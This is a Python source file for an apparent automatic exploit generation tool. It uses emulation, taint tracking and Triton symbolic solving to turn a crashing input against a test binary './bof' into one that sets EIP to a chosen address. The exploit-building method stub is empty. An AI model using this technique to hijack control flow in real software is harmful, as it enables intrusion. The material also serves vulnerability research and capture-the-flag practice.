#!/usr/bin/env python
# coding=utf-8

"""
Module name: Exploiter.py
Create by:   Bluecake
Description: Basic class for automatic exploitation
"""

from emulator import *
import os
from pwn import u32, asm, context
from triton import OPCODE, Instruction


"""
Basic class for exploit framework.
Hope to provide some functions for high level exploitation
"""
class Exploiter(object):

    def __init__(self, binary):

        self.binary = binary
        self.log = get_logger('solve.py', logging.DEBUG)

    
    """
    New and init an emulator
    """
    def initEmulator(self, show=False, symbolize=False, isTaint=False):

        emulator = Emulator(self.binary, show=show, symbolize=symbolize, isTaint=isTaint)
        emulator.initialize()

        # create pipe for SYSCALL read
        emulator.read, emulator.write = os.pipe()
        with open('./crash.in', 'rb') as f:
            data = f.read()
            os.write(emulator.write, data + '\n')
        
        return emulator


    """
    Check whether an input can cause program crash 
    """
    def isCrashable(self):
        
        emulator = self.initEmulator()
        pc = emulator.getpc()

        try:
            while pc:
                pc = emulator.process()
            return False

        except IllegalPcException:
            self.log.info("receive crash info at " + hex(pc))
            self.read_record = emulator.read_record 
            self.crash_pc = pc
            esp = emulator.getreg('esp') - 4
            self.dst = range(esp, esp + 4)
            return True


    """
    Locate input which can influence target data
    """
    def locateSource(self, src, dst):
        
        if len(src) == 1:
            return src

        left = src[ : len(src)/2]
        right = src[len(src)/2 : ]
        
        emulator = self.initEmulator(isTaint=True)
        emulator.taintable = left

        pc = emulator.getpc()
        while pc != self.crash_pc:
            pc = emulator.process()

        if emulator.isTainted(dst):
            new_left = self.locateSource(left, dst)
        else:
            new_left = []

        emulator = self.initEmulator(isTaint=True)
        emulator.taintable = right

        pc = emulator.getpc()
        while pc != self.crash_pc:
            pc = emulator.process()
            
        if emulator.isTainted(dst):
            new_right = self.locateSource(right, dst)
        else:
            new_right = []

        return new_left + new_right


    """
    Track source input of memory content
    """
    def traceMemory(self):

        if self.isCrashable():

            self.src = []
            for rc in self.read_record:

                start = rc[0]
                length = rc[1]
                self.src.extend(range(start, start + length))
            
            source = self.locateSource(self.src, self.dst)
            return source

        else:
            print 'not crashable'
            return False
            
    
    def solve(self):

        symbolized = self.traceMemory()

        if not symbolized:
            return False
        
        print hex(self.crash_pc)
        print map(hex, self.src)
        print map(hex, symbolized)

        emulator = self.initEmulator(symbolize=True)
        emulator.symbolized = symbolized

        pc = emulator.getpc()
        while pc != self.crash_pc:
            pc = emulator.process()
         
        Triton = emulator.triton
        astCtxt = Triton.getAstContext()

        constraints = [Triton.getPathConstraintsAst()]
        
        target_pc = 0x11223344

        gadgets = "mov eax, dword ptr [esp]"
        inst = Instruction()
        inst.setOpcode(asm(gadgets))
        inst.setAddress(0)
        Triton.processing(inst)
        
        eax_sym = Triton.getSymbolicExpressionFromId(Triton.getSymbolicRegisterId(Triton.registers.eax))
        print eax_sym
        eax_ast = eax_sym.getAst()

        constraints.append(eax_ast == target_pc)

        cstr  = astCtxt.land(constraints)

        print '[+] Asking for a model, please wait...'
        model = Triton.getModel(cstr)

        new_output = {}
        for addr in self.src:
            new_output[addr] = 'a'

        # Save new state
        for k, v in model.items():
            print '[+]', v
            index = int(v.getName().replace('SymVar_', ''))
            new_output[symbolized[index]] = chr(v.getValue())
        
        flag = ''
        for addr in self.src:
            flag += new_output[addr]
        open('eip.in', 'wb').write(flag)
        print flag
    
    def create_exp(self):
        pass

if __name__ == '__main__': 
    os.system('rm /tmp/dump.bin')
    solver = Exploiter('./bof')
    solver.solve()
